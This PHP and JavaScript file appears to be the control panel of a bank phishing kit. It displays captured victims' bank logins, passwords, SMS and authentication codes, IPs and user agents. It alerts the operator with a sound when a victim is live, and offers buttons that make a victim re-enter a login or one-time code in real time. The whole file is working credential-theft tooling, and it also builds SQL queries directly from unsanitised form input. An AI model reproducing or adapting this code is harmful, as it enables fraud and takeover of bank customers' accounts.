


<?php include('header.php'); 
include('YH0uW3ecaRHG16ld4waY.php');
include('db.php'); 

//echo '<script>alert("'.$session_role.'");</script>';
//echo '<script>alert('.$_SESSION['user_id'].');</script>';
$new1 = $con->query("SELECT * FROM `payment` WHERE `beep` = '1' order by last_login");
$counting = $new1->num_rows;

 if(isset($_POST['delete_all'])){
	$clone_id = clone_id;
	$sqldel = "DELETE FROM payment WHERE id!='$clone_id' AND last_login>2400;";
	$con->query($sqldel);
 }

	
	
if($_GET['delete']=='else'){
    if(isset($_POST['delete'])){
 $cnt=array();
 $cnt=count($_POST['checkbox']);

        for($i=0;$i<$cnt;$i++){
            $del_id=$_POST['checkbox'][$i];
        $sqldel = "DELETE FROM payment WHERE id='$del_id'";
        $con->query($sqldel);
//        echo '<script>window.location.href="payment.php?payment_id="'.$payment_id.'";</script>';
            
        }        
    }
}
?>

<style>
</style>
    <div  class="column content-column" style="overflow:scroll !important;height:80vh;">

<?php 


if($_GET['delete']=='else'){
    if(isset($_POST['delete'])){
		 $cnt=array();
		 $cnt=count($_POST['checkbox']);

        for($i=0;$i<$cnt;$i++){
            $del_id=$_POST['checkbox'][$i];
        
        //echo '<script>alert("'.$del_id.'");</script>';
        $sqldel = "DELETE FROM payment WHERE id='$del_id'";
        $con->query($sqldel);
//        echo '<script>window.location.href="payment.php?payment_id="'.$payment_id.'";</script>';   
        }
    }
    echo '<script>window.location.href="usrauth.php";</script>';
}

if(isset($_GET['sound'])){
$new1 = $con->query("SELECT * FROM `payment` WHERE `beep` = '1'  order by last_login");
echo $counting = $new1->num_rows;
}else{
?>
      <div class="col-md-12" style="padding: 0px 0px 0px 0px !important" style="overflow:scroll; height:100px;">

        <div class="list-header fill">
          <div class="list-filter clearfix">
           <div class="pull-right">
             <div class="btn-group  list-sorter">

            </div>
            </div>
            <div>

            </div>
          </div>
        </div>
<?php 
if($counting > 0){
?>

<audio id="myAudio">
  <source src="deeg3beep-01a.wav" type="audio/wav">
  <source src="deeg3beep-01a.mp3" type="audio/mpeg">
  Your browser does not support the audio element.
</audio>
<!--<embed src="deeg3beep-01a.wav" autostart="false" width="0" height="0"  enablejavascript="true"> -->
<?php 
//$con->query("UPDATE `payment` SET `beep` = '0' WHERE  `beep` = '1'");
} ?>
        <div id="ember1921" class="scroll-y fill body scrollbox noscroll-x ember-view" style="height: 1000px;padding: 0px 0px 0px 0px ">   
        <div id="ember1922" class="ember-view">
<script>
var x = document.getElementById("myAudio"); 

function playAudio() { 
    x.play(); 
} 

function pauseAudio() { 
    x.pause(); 
} 
playAudio();
</script>
</div>
<form id="emberdiv" action="usrauth.php?delete=else" method="post">

<div class="pull-right">
<?php
if($session_role=='admin'){
$sqsp1 = "SELECT * FROM `payment` WHERE `block_status` = 'unblocked'";
$newsp1 = $con->query($sqsp1);
}else{
$sqsp11 = "SELECT * FROM `payment` WHERE `block_status` = 'unblocked' AND `company_email` = '$session_email'";
$newsp1 = $con->query($sqsp11);
}
$rowsp1 = $newsp1->fetch_assoc();
$num1 = $newsp1->num_rows;

$sqsp2 = "SELECT * FROM `payment` WHERE  `block_status` = 'unblocked' AND `block_session` = '$session_email'";
$newsp2 = $con->query($sqsp2);
$rowsp2 = $newsp2->fetch_assoc();
$num2 = $newsp2->num_rows;


if($num1!=$num2){
?>
                      <a href="block_unblock.php?session_emails=<?php echo $session_email; ?>&status=blocked&page_name=usrauth.php" class="btn btn-danger"> 
                        <i class="fa fa-lock"></i>&nbsp;block All
                      </a>
<?php }else{ ?>
                      <a href="block_unblock.php?session_emails=<?php echo $session_email; ?>&status=unblocked&page_name=usrauth.php" class="btn btn-success"> 
                        <i class="fa fa-unlock"></i>&nbsp;Unlock All
                      </a>
<?php } ?>

                      <button class="btn btn-danger popovercontainer ember-view" type="submit" name="delete" > 
                        <i class="fa fa-trash"></i>&nbsp;Delete
                      </button>
					  
					  <button class="btn btn-danger popovercontainer ember-view" type="submit" name="delete_all" > 
                        <i class="fa fa-trash"></i>&nbsp;Delete Last All
                      </button>

                      <a  class="btn btn-primary" onclick="check_full('<?php echo $session_email; ?>','<?php echo $session_role; ?>','on')">
                        Check All
                      </a>
                      <a  class="btn btn-primary" onclick="check_full('<?php echo $session_email; ?>','<?php echo $session_role; ?>','off')">
                        Unheck All
                      </a>
            

<br><br>
</div>

<table class="table table-hover zi-table  ember-view" style="overflow-y:scroll;" id="embertable1" >  
         <thead>
            <tr>
                 <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="Email" class="pull-left over-flow"> Payment Amount</div>
                  </th>
                 <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="Email" class="pull-left over-flow"> Login Status</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Trans. Id</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Bank Name</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Status</div>
                  </th>
                 <th style="" id="ember1926" class="sortable text-left ember-view">
                    <div title="Company Name" class="pull-left over-flow"> Login / Password</div>
                  </th>
                 <th style="" id="ember1926" class="sortable text-left ember-view">
                    <div title="Company Name" class="pull-left over-flow"> Others</div>
                  </th>
                 <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="Email" class="pull-left over-flow"> Authentication Code</div>
                  </th>
                  <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="userip" class="pull-left over-flow"> UserIP/Agent</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Action</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Clone</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Block</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Trash</div>
                  </th>
            </tr>
          </thead>


        <tbody>
            <?php 
            $header_2=0;
            $con->query("UPDATE `payment` SET `last_login` = `last_login`+'10' WHERE 1");
            if($session_role=='admin'){
				//echo "admin";
				//$sql1 = "SELECT * FROM `payment`   order by last_login";
				//$new1 = $con->query($sql1);
				
				$sql1 = "SELECT * FROM `payment` WHERE last_login<'180' order by order_flag_time ";
				$new1 = $con->query($sql1);
				$paolo_arr = [];
				while ($pay = $new1->fetch_assoc()) {
					$paolo_arr[] = $pay;
				}
				
				$sql1 = "SELECT * FROM `payment` WHERE  last_login>='180' order by last_login ";
				$new1 = $con->query($sql1);
				while ($pay = $new1->fetch_assoc()) {
					$paolo_arr[] = $pay;
				}
				
				$new1 = $paolo_arr;
            }else{
				//echo "user123";
				$sql1 = "SELECT * FROM `payment` WHERE `break` = 'off' AND `company_email` = '$session_email' AND last_login<'180' order by order_flag_time ";
				$new1 = $con->query($sql1);
				$paolo_arr = [];
				while ($pay = $new1->fetch_assoc()) {
					$paolo_arr[] = $pay;
				}
				
				$sql1 = "SELECT * FROM `payment` WHERE `break` = 'off' AND `company_email` = '$session_email' AND last_login>='180' order by last_login ";
				$new1 = $con->query($sql1);
				while ($pay = $new1->fetch_assoc()) {
					$paolo_arr[] = $pay;
				}
				
				$new1 = $paolo_arr;
            }
            foreach ($new1 as $pay) {
            $acode = $pay['code'];
			//echo json_encode($pay);
            ?>

            <?php if($pay['last_login'] > '180' && $header_2==0){ $header_2=1;?>

</tbody>
        </table>
<table class="table table-hover zi-table  ember-view" style="overflow-y:scroll;" id="embertable2" ng-app="">  
         <thead>
            <tr>
                 <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="Email" class="pull-left over-flow"> Payment Amount</div>
                  </th>
                 <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="Email" class="pull-left over-flow"> Login Status</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Trans. Id</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Bank Name</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Status</div>
                  </th>
                 <th style="" id="ember1926" class="sortable text-left ember-view">
                    <div title="Company Name" class="pull-left over-flow"> Login / Password</div>
                  </th>
                 <th style="" id="ember1926" class="sortable text-left ember-view">
                    <div title="Company Name" class="pull-left over-flow"> Others</div>
                  </th>
                 <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="Email" class="pull-left over-flow"> Authentication Code</div>
                  </th>
                  <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="userip" class="pull-left over-flow"> UserIP/Agent</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Action</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Clone</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Block</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Trash</div>
                  </th>
            </tr>
          </thead>


        <tbody>

<?php } ?>

                <tr data-ember-action="" data-ember-action-1946="1946" style="background: <?php if($pay['status'] == 'block')
				{ echo '#F7B0DB'; }elseif($pay['status'] == 'aproove')
				{ echo '#20b523'; }elseif($pay['status'] == 'login_aproove')
				{ echo '#FFA500'; }elseif($pay['status'] == 'copy')
				{ echo '#77f97b'; } ?>">

				<td>
					<!--<i class="fa fa-user"></i>
					<?php echo $pay['company_email']; ?>-->
					<?php echo $pay['payment'];?></td>
                <td id="ember1961" class="ember-view">
					<?php 
						if($pay['last_login'] < '180'){ 
							echo '<i class="fa fa-power-off" style="color:green;"></i> Active';
						}
						else { 
							echo '<i class="fa fa-power-off" style="color:red;"></i> '.$pay['last_login'].' Sec ago'; 
						} 
					?>
                </td>
                <td id="ember1965" class="ember-view">
                    <input type="text" id="id<?php echo $pay['id']; ?>" name="" value="<?php echo "https://".$_SERVER['SERVER_NAME']."/".URL_directory1; ?>index.php?id=<?php echo $pay['id']; ?>" style="width: 10px;" readonly><?php $ids=$pay['id']; ?>
<a onclick="copy('#id<?php echo $ids; ?>');" class="btn btn-primary popovercontainer ember-view"><?php echo $pay['id']; ?></a>

</td>

                <td id="ember1965" class="ember-view">
                  <?php echo $pay['bank_name']; ?>
                </td>

                <td id="ember1965" class="ember-view">
                 <?php if($pay['last_login'] < '180'){ if($pay['page_name']=='index.php'){echo 'Login page'; }elseif(($pay['page_name']=='mtransfer_steptwo.php') || ($pay['page_name']=='indexauth.php')){echo 'Authcode page'; } } ?>
                </td>

                <td id="ember1960" class="ember-view">    
                    <input type="text" id="user<?php echo $ids; ?>" name="" value="<?php echo $pay['bank_user_id']; ?>" style="width: 100px; background:transparent;" onclick="copy('#user<?php echo $ids; ?>');" readonly>
                  - <input type="text" id="pass<?php echo $ids; ?>" name="" value="<?php echo $pay['bank_user_password']; ?>" style="width: 100px;  background:transparent;" onclick="copy('#pass<?php echo $ids; ?>');" readonly>
                </td>
                <td id="ember1960" class="ember-view">
                    <input type="text" id="jss<?php echo $ids; ?>" name="" value="<?php echo $pay['bank_auth_type']; ?>" style="width: 100px; background:transparent;" onclick="copy('#jss<?php echo $ids; ?>');" readonly>
                  - <input type="text" id="ass<?php echo $ids; ?>" name="" value="<?php echo $pay['bank_auth_pass']; ?>" style="width: 100px;  background:transparent;" onclick="copy('#ass<?php echo $ids; ?>');" readonly>
                </td>
                
                <td id="ember1961" class="ember-view">
                    <input type="text" id="pass<?php echo $pay['code']; ?>" name="" value="<?php echo $pay['code'];  ?>" style="width: 100px;  background:transparent;" onclick="copy('#pass<?php echo $acode; ?>');" readonly>
                  <!--<a id="code<?php echo $pay['code']; ?>" onclick="copy('#code<?php echo $acode; ?>');"><?php if(($pay['status']=='show') || ($pay['status']=='aproove')){ echo $pay['code']; } ?></a>-->
                  <br>
                  <input type="text" id="gridcode<?php echo $pay['id'] ?>" name="" value="<?php echo $pay['gridcode'];  ?>" style="width: 30px;  background:transparent;" > 
<!--                   <input id="check1" name="grid" class="ember-checkbox ember-view" type="checkbox" onclick="changegrid('<?php echo $pay['id'] ?>')" style="cursor: pointer;" <?php if(strlen($pay['gridcode'])>0){ echo "checked='checked'"; } ?>> -->
                  <input id="check<?php echo $pay['id'] ?>" name="grid" class="ember-checkbox ember-view" type="checkbox" onclick="changegrid('<?php echo $pay['id'] ?>')" style="cursor: pointer;" <?php if($pay['checked']>0){ echo "checked='checked'"; } ?>>
                  <!--input type="text" id="gridvalue<?php echo $pay['gridvalue']; ?>" name="" value="<?php echo $pay['gridvalue'];  ?>" style="width: 50px;  background:transparent;" readonly-->
                  <!--<a id="code<?php echo $pay['code']; ?>" onclick="copy('#code<?php echo $acode; ?>');"><?php if(($pay['status']=='show') || ($pay['status']=='aproove')){ echo $pay['code']; } ?></a>-->
                 

                 <!-- <text><?php $pay['gridcode'] ?></text>
                  <input placeholder="Smscode" style="
                                <?php if(($pay['checked']==0)&&($pay['gridcode'] != "")) { echo "display: none"; } ?>
                  " >
                  <input placeholder="Code numer" style="
                                <?php if(($pay['checked']==0)&&($pay['gridcode'] == "")) { echo "display: none"; } ?>
                  " > -->
				  
                </td>
                <td id="ember1960" class="ember-view">    
                    <input type="text" id="ipss<?php echo $ids; ?>" onclick="copy('#ipss<?php echo $ids; ?>');" name="" value="<?php echo $pay['userip']; ?>" style="width: 100px; background:transparent;"  readonly>
                  - <input type="text" id="agass<?php echo $ids; ?>"  onclick="copy('#agass<?php echo $ids; ?>');" name="" value="<?php echo $pay['useragent']; ?>" style="width: 100px;  background:transparent;"  readonly>
                </td>
                <td id="ember1962" class="ember-view">
                  <?php  if($pay['status']=='aproove'){  ?>
                  <button style="background-color: green;padding: 5px 20px 5px 20px;color: white" disabled="">Aprooved</button>
                  <a href="status_payment.php?id=<?php echo $pay['id']; ?>" class="btn btn-primary">Reload</a>
                  <?php }elseif($pay['status']=='block'){}else{ ?>
                  <input id="check" name="status" class="ember-checkbox ember-view" type="radio" onclick="aproove(<?php echo $pay['id'] ?>)" style="cursor: pointer;" <?php if($pay['status']=='login_aproove'){ echo "checked='checked'"; } ?>>L OK
                  <input id="check" name="status" class="ember-checkbox ember-view" type="radio" onclick="status_aproove(<?php echo $pay['id'] ?>)" <?php if($pay['status']=='aprove'){ echo "checked='checked'"; } ?> style="cursor: pointer;">Kod OK<br>
                  <input id="check" name="status" class="ember-checkbox ember-view" type="radio" onclick="logoncancel(<?php echo $pay['id'] ?>)" style="cursor: pointer;" <?php if($pay['status']=='login_invalid'){ echo "checked='checked'"; } ?>>LOG X
                  <input id="check" name="status" class="ember-checkbox ember-view" type="radio" onclick="status_cancel(<?php echo $pay['id'] ?>)" style="cursor: pointer;" <?php if($pay['status']=='invalid_code'){ echo "checked='checked'"; } ?>>KOD X
                  <?php } ?>
                  <button id="but" style="background-color: green;padding: 5px 20px 5px 20px;color: white;display: none" disabled="">Aprooved</button>
                </td>
                <td id="ember1961" class="ember-view">
                  <a href="pay_copy.php?id=<?php echo $pay['id'];  ?>" style="color:red;"><i class="fa fa-clone"></i></a>
                </td>
                <td id="ember1961" class="ember-view">
                    <?php if($pay['block_status']=='unblocked'){ ?>
                  <a href="pay_block.php?id=<?php echo $pay['id'];  ?>&status=block" style="color:red;"><i class="fa fa-ban"></i></a>
                    <?php } if($pay['block_status']=='block'){ ?>
                  <a href="pay_block.php?id=<?php echo $pay['id'];  ?>&status=unblocked" style="color:green;"><i class="fa fa-unlock"></i></a>
                    <?php } ?>
                </td>
                <td id="ember1961" class="ember-view">
                  <a href="pay_delete.php?id=<?php echo $pay['id'];  ?>&page=usrauth.php" style="color:red;"><i class="fa fa-trash"></i></a>

<?php if($pay['checkbox']=='on'){ ?>
               &nbsp; <input name="checkbox[]" type="checkbox" value="<?php echo $pay['id']; ?>" id="<?php echo $pay['id']; ?>" style="cursor:pointer" onclick="check_boxes(<?php echo $pay['id']; ?>,this.value)" checked="">                  
<?php }else{ ?>
               &nbsp; <input name="checkbox[]" type="checkbox" value="<?php echo $pay['id']; ?>" id="<?php echo $pay['id']; ?>" style="cursor:pointer" onclick="check_boxes(<?php echo $pay['id']; ?>,this.value)">                  

<?php } ?>
                </td>
            </tr>



<?php }  ?>

        <!----></tbody>
        </table>
</form>    
        
        <div>
        </div>
        </div>     

        <?php } ?>
      </div>
 
 <?php
 $on = 'on';
 $off = 'off';
 ?>
<script>
/************************************* CHECKALL ************************************/

function changegrid(id){

  var gridcode=document.getElementById('gridcode'+id).value;
  var checked = document.getElementById('check'+id).checked;
        if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } 
        else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //alert(this.responseText);


               $("#emberdiv").load(location.href + " #emberdiv");
               //$("#embertable2").load(location.href + " #embertable2");
            }
        };
        checked == true ? checked = 1:checked = 0;
        xmlhttp.open("GET","ajaxgridupdate.php?id="+ id + "&gridcode=" + gridcode + "&checked=" + checked,true);
 //       xmlhttp.open("GET","ajaxgridupdate.php?id="+ id + "&gridcode=" + gridcode,true);
        xmlhttp.send(); 
}

function check_full(email,role,value) { 
   
    if (email == "") {
    } else { 
        if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //alert(this.responseText);


               $("#emberdiv").load(location.href + " #emberdiv");
               //$("#embertable2").load(location.href + " #embertable2");
            }
        };
        xmlhttp.open("GET","check_all_ajax.php?email="+ email + "&role=" + role + "&value=" + value,true);
        xmlhttp.send();
    }
}
/************************************* CHECKALL ************************************/ 



/************************ CHECKBOXES *****************************/
function check_boxes(str,value) {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                
               //$("#embertable").load(location.href + " #embertable");
                    //document.getElementById("embertable").innerHTML = this.responseText;
                    //alert(this.responseText);
                
            }
        };
        xmlhttp.open("GET", "checkboxes_ajax.php?id="+ str , true);
        xmlhttp.send();
}
/************************ CHECKBOXES *****************************/


function copy(id) 
{//alert()
document.querySelector(id).select();
document.execCommand('copy');

}
function table_refresh() {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                
               $("#emberdiv").load(location.href + " #emberdiv");
               //$("#embertable2").load(location.href + " #embertable2");
                    //document.getElementById("embertable").innerHTML = this.responseText;
                
            }
        };
        xmlhttp.open("GET", "user_123123auth_ajax.php", true);
        xmlhttp.send();
}
table_refresh();
                     setInterval(function(){ table_refresh(); }, 10000);

function status_aproove(payment_id) {
//    alert(payment_id);
    if (payment_id.length == 0) {
    } else {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                if(this.responseText=='aproove'){
               $("#emberdiv").load(location.href + " #emberdiv");
               //$("#embertable2").load(location.href + " #embertable2");
                    
/*                    document.getElementById("check").style.display = 'none';
                    document.getElementById("but").style.display = 'block';
                    document.getElementById("buts").style.display = 'block'; */
                }
            }
        };
        xmlhttp.open("GET", "ajax/ajax_approve.php?payment_id=" + payment_id, true);
        xmlhttp.send();
    }
}
function aproove(payment_id) {
    if (payment_id.length == 0) {
    } else {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                if(this.responseText=='aproove'){
                       //alert('user approved');
                    //document.getElementById("check").style.display = 'none';
                    //document.getElementById("but").style.display = 'block';
                }
            }
        };
        xmlhttp.open("GET", "ajax/ajax_approve_login.php?payment_id=" + payment_id, true);
        xmlhttp.send();
    }
}
function logoncancel(payment_id) {
    if (payment_id.length == 0) {
    } else {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                if(this.responseText=='aproove'){
                    alert('user informed to submit login details again');
                    //document.getElementById("check").style.display = 'none';
                    //document.getElementById("but").style.display = 'block';
                }
            }
        };
        xmlhttp.open("GET", "ajax/ajax_approve_invalide.php?status=login_invalid&payment_id=" + payment_id, true);
        xmlhttp.send();
    }
}
function status_cancel(payment_id) {
    if (payment_id.length == 0) {
    } else {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                if(this.responseText=='aproove'){
                       alert('user informed to submit sms code again');
                    //document.getElementById("check").style.display = 'none';
                    //document.getElementById("but").style.display = 'block';
                }
            }
        };
        xmlhttp.open("GET", "ajax/ajax_approve_invalide.php?status=invalid_code&payment_id=" + payment_id, true);
        xmlhttp.send();
    }
}
</script>


    </div>
</body>
</html>
<script type="text/javascript">
                      //setTimeout(function(){ window.location.href="usrauth.php"; }, 10000);

</script>

<!-- --------------------- --- MODEL BOX --- -------------------- -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.min.css" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.min.js"></script>
<button type="button" class="btn btn-info" data-toggle="modal" data-target="#myModal">Open Modal</button>
<!-- --------------------- --- MODEL BOX --- -------------------- -->

<!-- ******************************** ADD MODEL *********************** -->
<style type="text/css">
.faq-list li {
    color: #860c0c;
    padding: 6px 0 10px;
        padding-top: 6px;
}   
.faq-list {
    padding: 6px 0 10px 20px;
}
.modal-content{
      left: 99%;
      top: 30%;
    min-height: 700px;
    width: 420px
  }
  .modal-body{
        height: 600px;
    overflow-y: scroll;
    overflow-x: hidden;
}
.modal{
overflow-x: hidden;
top: 5%;
}
.close{
  margin-right: 25px;
}
</style>
<div id="myModals" class="modal fade" role="dialog">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal">&times;</button>
        <h4 class="modal-title">Page Tips</h4>
      </div>
      <div class="modal-body">


  <div class="pagetips-list">
    <p class="text-uppercase"><b></b></p>
    <ul class="faq-list f12">
     <li>
       <a href="" target="_blank">
 
       </a>
     </li>
     <li>
       <a href="" target="_blank">
eful?
       </a>
     </li>
     <li>
       <a href="" target="_blank">

       </a>
     </li>
     <li>
       <a href="" target="_blank">

       </a>
     </li>
     <li>
       <a href="" target="_blank">
   </a>
     </li>
     <li>
       <a href="" target="_blank">

       </a>
     </li>
     <li>
       <a href="" target="_blank">

       </a>
     </li>
     <li>
       <a href="" target="_blank">

       </a>
     </li>
     <li>
       <a href="" target="_blank">
       
       </a>
     </li>
    </ul>
</div>


              <div class="modal-footer">  
</div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- ******************************** ADD MODEL *********************** -->


<!-- ******************************** AMARJEET *********************** -->

<script>
setInterval(function(){ show_sound(); }, 1000);
show_sound();
function show_sound() {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
//alert(this.responseText);
  if(this.responseText>='1'){
playAudio();
no_sound();
}
          }
        };
        xmlhttp.open("GET", "512user_so342und.php?session_email=<?php echo $session_email; ?>&session_role=<?php echo $session_role; ?>", true);
        xmlhttp.send();
}
</script>




<script>
function no_sound(){
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
//alert(this.responseText);

          }
        };
        xmlhttp.open("GET", "12user_12nosound.php?session_email=<?php echo $session_email; ?>&session_role=<?php echo $session_role; ?>", true);
        xmlhttp.send();
}

</script>


<audio id="myAudio">
  <source src="bringding.mp3" type="audio/mpeg">
  <source src="bringding.mp3" type="audio/mpeg">
  Your browser does not support the audio element.
</audio>

<script>
var x = document.getElementById("myAudio"); 
function playAudio() { 
    x.play(); 
} 

function pauseAudio() { 
    x.pause(); 
} 
</script>

<script src="jquery.min.js"></script>

<!-- ******************************** AMARJEET *********************** -->
